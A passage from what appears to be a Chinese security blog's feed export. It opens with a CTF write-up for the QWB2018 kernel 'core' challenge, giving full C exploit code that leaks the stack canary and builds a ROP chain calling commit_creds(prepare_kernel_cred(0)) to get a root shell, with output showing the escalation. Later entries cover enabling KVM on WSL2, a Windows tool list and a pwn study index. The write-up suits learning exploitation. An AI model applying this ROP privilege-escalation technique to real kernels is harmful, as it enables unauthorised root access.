来开启默认调试端口,<code>start.sh</code> 中已经有了 <code>-s</code>,不必再自己设置。</p><p>另外通过 <code>gdb ./vmlinux</code> 启动时,虽然加载了 kernel 的符号表,但没有加载驱动 <code>core.ko</code> 的符号表,可以通过 <code>add-symbol-file core.ko textaddr</code> 加载</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">help</span> add-symbol-file</span><br><span class="line">Load symbols from FILE, assuming FILE has been dynamically loaded.</span><br><span class="line">Usage: add-symbol-file FILE ADDR [-readnow | -readnever | -s SECT-NAME SECT-ADDR]...</span><br><span class="line">ADDR is the starting address of the file<span class="string">&#x27;s text.</span></span><br><span class="line"><span class="string">Each &#x27;</span>-s<span class="string">&#x27; argument provides a section name and address, and</span></span><br><span class="line"><span class="string">should be specified if the data and bss segments are not contiguous</span></span><br><span class="line"><span class="string">with the text.  SECT-NAME is a section name to be loaded at SECT-ADDR.</span></span><br><span class="line"><span class="string">The &#x27;</span>-readnow<span class="string">&#x27; option will cause GDB to read the entire symbol file</span></span><br><span class="line"><span class="string">immediately.  This makes the command slower, but may make future operations</span></span><br><span class="line"><span class="string">faster.</span></span><br><span class="line"><span class="string">The &#x27;</span>-readnever<span class="string">&#x27; option will prevent GDB from reading the symbol file&#x27;</span>s</span><br><span class="line">symbolic debug information.</span><br></pre></td></tr></table></figure><p>.text 段的地址可以通过 <code>/sys/modules/core/section/.text</code> 来查看,查看需要 root 权限,因此为了方便调试,我们再改一下 <code>init</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># setsid /bin/cttyhack setuidgid 1000 /bin/sh</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure><p>这样重新用打包以后,启动时就是<code>root</code>权限了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  give_to_player ./start.sh</span><br><span class="line">qemu-system-x86_64: warning: TCG doesn<span class="string">&#x27;t support requested feature: CPUID.01H:ECX.vmx [bit 5]</span></span><br><span class="line"><span class="string">[    0.024759] Spectre V2 : Spectre mitigation: LFENCE not serializing, switching to generic retpoline</span></span><br><span class="line"><span class="string">udhcpc: started, v1.26.2</span></span><br><span class="line"><span class="string">udhcpc: sending discover</span></span><br><span class="line"><span class="string">udhcpc: sending select for 10.0.2.15</span></span><br><span class="line"><span class="string">udhcpc: lease of 10.0.2.15 obtained, lease time 86400</span></span><br><span class="line"><span class="string">insmod: can&#x27;</span>t <span class="built_in">read</span> <span class="string">&#x27;/core.ko&#x27;</span>: No such file or directory</span><br><span class="line">/ <span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">/ <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>接着就可以看<code>.text</code>段的地址了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># cat /sys/module/core/sections/.text</span></span><br><span class="line">0xffffffffc0364000</span><br></pre></td></tr></table></figure><p>偏移计算:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  core python2</span><br><span class="line">Python 2.7.17 (default, Apr 15 2020, 17:20:14)</span><br><span class="line">[GCC 7.5.0] on linux2</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; vmlinux = ELF(<span class="string">&quot;./vmlinux&quot;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/mnt/d/Users/Lantern/Desktop/note/pwn_note/kernal/linux_kernel_pwn-master/qwb2018-core/give_to_player/core/vmlinux&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    Version:  4.15.8</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0xffffffff81000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">&gt;&gt;&gt; hex(vmlinux.sym[<span class="string">&#x27;commit_creds&#x27;</span>] - 0xffffffff81000000)</span><br><span class="line"><span class="string">&#x27;0x9c8e0&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="get-root-shell"><a href="#get-root-shell" class="headerlink" title="get root shell"></a>get root shell</h3><p>exp:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spawn_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spwan shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds) &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred) &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">0x10</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds)) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__ (</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> idx)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] open /proc/core error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred; <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx;</span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret;</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)spawn_shell; <span class="comment">// rip</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整思路就是用rop链达到执行<code>commit_creds(prepare_kernel_cred(0))</code>以提权目的, 之后用<code>swapgs; iretq</code>返回到用户态<br>执行用户空间的<code>system(&quot;/bin/sh&quot;)</code>获取shell</p><p>编译:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc exploit.c -statoc -masm=intel -g -o exploit</span><br></pre></td></tr></table></figure><p>使用 intel 汇编需要加上 -masm=intel</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  give_to_player cp exploit core/tmp/</span><br><span class="line">➜  give_to_player <span class="built_in">cd</span> core</span><br><span class="line">➜  give_to_player ./gen_cpio.sh core.cpio</span><br><span class="line">....</span><br><span class="line">➜  give_to_player cp core.cpio ..</span><br><span class="line">➜  give_to_player <span class="built_in">cd</span> ..</span><br><span class="line">➜  give_to_player ./start.sh</span><br><span class="line">......</span><br><span class="line">/ $ ls /tmp/</span><br><span class="line">exploit   kallsyms</span><br><span class="line">/ $ id</span><br><span class="line">uid=1000(chal) gid=1000(chal) groups=1000(chal)</span><br><span class="line">/ $ /tmp/exploit</span><br><span class="line">[*]status has been saved.</span><br><span class="line">commit_creds addr: 0xffffffffbd09c8e0</span><br><span class="line">vmlinux_base addr: 0xffffffffbd000000</span><br><span class="line">prepare_kernel_cred addr: 0xffffffffbd09cce0</span><br><span class="line">[*]<span class="built_in">set</span> off to 64</span><br><span class="line">[*]<span class="built_in">read</span> to buf.</span><br><span class="line">[+]canary: 0x6be486f377bb8600</span><br><span class="line">[*]copy from user with size: -65280</span><br><span class="line">/ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSL2 开启KVM</title>
      <link href="/tool-wsl2-kvm/"/>
      <url>/tool-wsl2-kvm/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>这两天一直在断断续续搞这个, 直到今天终于成功了。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于使用了WSL2开启了Hyper-V, VMware无法使用嵌套虚拟化, 因此就想在wsl2上使用qemu, 这里搞了很久……</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Windows版本:  Windows10 20161</p><p>WSL内核版本:  4.19.121-microsoft-standard</p><p>WSL版本: Ubuntu18.04</p><h2 id="开启kvm"><a href="#开启kvm" class="headerlink" title="开启kvm"></a>开启kvm</h2><p>按照这篇文件就可以了<a href="https://boxofcables.dev/accelerated-kvm-guests-on-wsl-2/">Accelerated KVM guests on WSL 2</a>, 但是要注意的是你按照文章中进行后, 可能会出现以下几个问题:</p><ul><li><p><strong>运行kvm-ok: Your cpu does not support kvm extensions</strong>, 这个是windows10 1909的问题, 需要升级windows10的版本, 选择预览版计划就可以了。</p></li><li><p><strong>无法自动挂载, dmesg显示: ERROR: UtilCreateProcessAndWait:655: /bin/mount failed with status 0x2000 after upgrading to build 20161</strong>: 这个是由于最新的wsl内核版本更新以后没有更新配置文件<code>Microsoft/config-wsl</code> (参照这个<a href="https://github.com/microsoft/WSL2-Linux-Kernel/issues/135">issue</a>, 开发背锅!), 因此不能使用<code>Microsoft/config-wsl</code>, 可以直接使用来自这个<a href="https://github.com/microsoft/WSL/issues/5481#issuecomment-649486542">回答</a>的配置文件</p></li><li><p><strong>无法正常启动, 错误代码4294967295</strong> :端口被占了, 可能你开启了vpn, 参照这个<a href="https://github.com/microsoft/WSL/issues/4929#issuecomment-616383430">回答</a>, 使用下面的代码kill占用的程序就可以了, 运行在powershell下</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$processes</span> = <span class="built_in">Get-Process</span> <span class="literal">-Id</span> (<span class="built_in">Get-NetUDPEndpoint</span> <span class="literal">-LocalPort</span> <span class="number">53</span>).OwningProcess | <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> Id</span><br><span class="line"></span><br><span class="line"><span class="keyword">ForEach</span> (<span class="variable">$process</span> <span class="keyword">in</span> <span class="variable">$processes</span>) &#123;</span><br><span class="line">    <span class="built_in">Stop-Process</span> <span class="literal">-ID</span> <span class="variable">$process</span> <span class="literal">-Force</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你用的是 Clash 则可以修改 General YAML, 将端口改大防止占用(<code>mixed-por</code> 和 <code>external-controller</code>), 配置如下:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mixed-port:</span> <span class="number">27890</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">info</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="string">&#x27;127.0.0.1:29091&#x27;</span></span><br><span class="line"><span class="attr">secret:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">ipv6:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Will be ignored after profile selection</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Debug</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">socks5</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">1080</span></span><br><span class="line"><span class="attr">proxy-groups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Proxy</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Debug</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;MATCH,DIRECT&#x27;</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wsl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实用工具/脚本分享</title>
      <link href="/tool-useful-tools/"/>
      <url>/tool-useful-tools/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>自用工具，想到就写进去, 里面的链接都是官网，请放心下载。</p><p><strong>Windows版本: Windows 11 教育版 21H2</strong></p><h2 id="现用工具"><a href="#现用工具" class="headerlink" title="现用工具"></a>现用工具</h2><p><a href="https://u.tools/">utools</a>: 类似wox的生产力工具合集，强推</p><p><a href="https://zh.snipaste.com/">Snipaste</a>: 截图/贴图工具</p><p><a href="https://github.com/Fndroid/clash_for_windows_pkg">Clash</a>: 代理分流工具</p><p><a href="https://ditto-cp.sourceforge.io/">Ditto</a>: 剪贴板增强工具, 可以保存复制内容</p><p><a href="https://www.voidtools.com/zh-cn/">Everything</a>: 文件搜索神器</p><p><a href="https://lopesoft.com/index.php/en/">FileMenuTools</a>: 右键增强工具</p><p><a href="https://foldermove.com/">Folder Move</a>: C盘空间不够用，又没钱买硬盘的方案, 原理是创建符号链接</p><p><a href="https://molunerfinn.com/PicGo/">PicGo</a>: 图片上传+管理工具</p><p><a href="https://github.com/barry-ran/QtScrcpy">Qtscrpy</a>: 基于上面 scrcpy 工具开发的qt界面, 用这个就行了</p><p><a href="https://typora.io/">Typora</a>: 可视化编写md工具, 可搭配<code>PicGo</code>实现图片自动上传</p><p><a href="https://github.com/martinrotter/rssguard">RSS Guard</a>: 开源的免费rss订阅器 + <a href="https://feed43.com/">Feed43</a>就可以订阅几乎所有了, <a href="https://greasyfork.org/zh-CN/scripts/373252-rss-show-site-all-rss">油猴脚本 RSS+</a>可以用来显示页面的 RSS</p><p><a href="https://www.stardock.com/products/groupy/">Groupy</a>: 将多个应用程序组织到Windows桌面上的分组选项卡中</p><p><a href="https://antibody-software.com/web/software/software/wiztree-finds-the-files-and-folders-using-the-most-disk-space-on-your-hard-drive/">wiztree</a>: SpaceSniffer已停止更新。换成<code>wiztree</code>。用来搭配<code>Folder Move</code></p><p><a href="https://www.tampermonkey.net/">Tampermonkey/油猴</a>: 一款免费的浏览器扩展和最为流行的用户脚本管理器</p><p><a href="https://code.visualstudio.com/">Visual Studio Code</a>: 轻量级代码/文本编辑器</p><ul><li>Markdown All in One : markdown 插件</li><li>Markdown Preview Enhanced: 预览 markdown</li><li>markdownlint: Markdown 语法检查插件</li><li>Material Icon Theme: Material 图标</li><li>Material Theme: Material 主题</li><li>PicGo: PicGo 插件</li><li>Sublime Text Keymap and Settings Importer: 可以在 vscode 里面使用 Sublime 的快捷键</li><li>TabNine: 超级好用的代码自动补全插件</li><li>Code Spell Checker: 代码拼写检查工具</li><li>Code Runner: 配置好了以后可以直接运行代码文件</li><li>C/C++: C/C++ 插件</li><li>Python: Python 插件</li><li>Insert DateTime: 用快捷键插入形如<code>2020-10-21 09:32:54</code>的时间字符串, 也可以修改模板使其更加符合你的使用规范</li></ul><p><a href="https://to-do.office.com/tasks/">Microsoft To Do</a>: 微软开发的任务清单, 支持安卓/PC/iOS 同步, 突然出现在我电脑的应用里, 觉得不错就拿来用了</p><p><a href="https://www.microsoft.com/en-us/p/windows-terminal/9n0dx20hk701?activetab=pivot:overviewtab">Windows Terminal</a>: 微软自己开发的终端窗口美化, 类似 cmder</p><p><a href="https://windowtop.info/">WindowTop</a>: Windows 窗口调整, 比如透明度, 置顶, 微缩等</p><p><a href="https://github.com/huiyadanli/RevokeMsgPatcher">微信/QQ/Tim 防撤回 + 微信多开</a>: 如名, github 一个开源工具</p><p><a href="https://github.com/focusbe/tinyImage">tinyImage</a>: 一款调用 tinypng.com 接口压缩图片的图片压缩工具</p><p><a href="http://www.bookxnote.com/">Bookxnote</a>: 一款轻便的PDF管理与阅读器</p><p><a href="https://github.com/BlackINT3/OpenArk/releases">OpenArk</a>: Windows 热键冲突检查</p><p><a href="https://www.mythicsoft.com/filelocatorpro/">Filelocator Pro</a>: 和Everything差不多，但是其强大之处在于可以搜索文件内容</p><p><a href="http://www.jflap.org/">JFLAP</a>: 画自动机的小工具<br><a href="https://stefansundin.github.io/altdrag/">Altdrag</a>: 按下alt键, 轻松拖动窗口。终于不用去找边角出现小箭头了！</p><p><a href="https://github.com/BluePointLilac/ContextMenuManager">ContextMenuManager</a>: 鼠标右键菜单管理, 删掉一些没用的项目，让右键菜单更整洁</p><p><a href="https://www.huorong.cn/">火绒</a>: 安全软件, 个人免费</p><h2 id="曾用工具"><a href="#曾用工具" class="headerlink" title="曾用工具"></a>曾用工具</h2><p><del><a href="https://rammichael.com/7-taskbar-tweaker">7+ Taskbar Tweaker</a>: 控制任务栏</del></p><p><del><a href="https://github.com/TranslucentTB/TranslucentTB">TranslucentTB</a>: 一个轻量级的工具控制Windows任务栏，例如使任务栏透明【Store商店可下载】</del></p><p><del><a href="https://github.com/ChanpleCai/SmartTaskbar">SmartTaskbar</a>: 可以控制任务栏，使得任务栏在最大化情况下隐藏任务栏【Store商店可下载】</del></p><p><del><a href="http://www.itsamples.com/taskbar-hider.html">TaskBar Hider</a>: 直接隐藏状态栏, 但是UI界面设置快捷键无效，直接<code>TaskbarHider.exe -hide</code>有效, 搭配utools的快捷命令并设置鼠标中间快捷启用也挺有用的。合理搭配Windows快捷键</del></p><p><del><a href="http://www.bitdock.cn/">BitDock</a>: 能像苹果一样弄一个底边栏</del>奇怪的bug, 开启后没效果, 不用了。<br><a href="https://www.microsoft.com/en-us/download/details.aspx?id=35460">Mouse without borders</a>:微软的工具，它允许你用一个鼠标和键盘控制多达四台电脑。这意味着使用鼠标无边界，您可以复制文本或拖放文件在计算机之间。</p><p><del><a href="http://www.uderzo.it/main_products/space_sniffer/download.html">SpaceSniffer</a>: 磁盘文件探查工具</del></p><p><del><a href="https://www.teamviewer.cn/">TeamViewer</a>: 远程桌面控制</del></p><p><del><a href="https://www.todesk.com/">ToDesk</a>: TeamViewer 莫名其妙卡上天, 换这个了</del>（内网远控，不用了）</p><p><del><a href="https://github.com/Genymobile/scrcpy">scrcpy</a>: 电脑通过usb控制手机</del></p>]]></content>
      
      
      <categories>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn 知识点清单</title>
      <link href="/note-pwn-pwn/"/>
      <url>/note-pwn-pwn/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>nuoye大佬带不动我了, 让我先补补基础</p><ul><li>无特殊说明都基于 Ubuntu18.04</li></ul><h2 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a>Pwntools</h2><p><a href="https://lantern.cool/note-tool-pwntools/">Pwntools</a></p><h2 id="Pwndocker"><a href="#Pwndocker" class="headerlink" title="Pwndocker"></a>Pwndocker</h2><p><a href="https://lantern.cool/note-tool-pwndocker/">pwndocker</a></p><h2 id="Pwndbg-Pwngdb"><a href="#Pwndbg-Pwngdb" class="headerlink" title="Pwndbg + Pwngdb"></a>Pwndbg + Pwngdb</h2><p><a href="https://lantern.cool/note-tool-pwndbg-pwngdb/">Pwngdb + Pwndbg 的联合使用</a></p><h2 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h2><p><a href="https://lantern.cool/note-pwn-linux-protect/">Linux 常用保护机制</a></p><h2 id="LibSearcher"><a href="#LibSearcher" class="headerlink" title="LibSearcher"></a>LibSearcher</h2><p>通过泄露的地址寻找libc版本</p><p>网页版：<a href="https://libc.blukat.me/">libc database search (blukat.me)</a> </p><p>libc-database: <a href="https://github.com/niklasb/libc-database">niklasb/libc-database: Build a database of libc offsets to simplify exploitation (github.com)</a></p><p>基于libc-database的:</p><p>Online: <a href="https://github.com/dev2ero/LibcSearcher">dev2ero/LibcSearcher: 🔍 LibcSearcher-ng – get symbols’ offset in glibc. (github.com)</a></p><p>Offline: <a 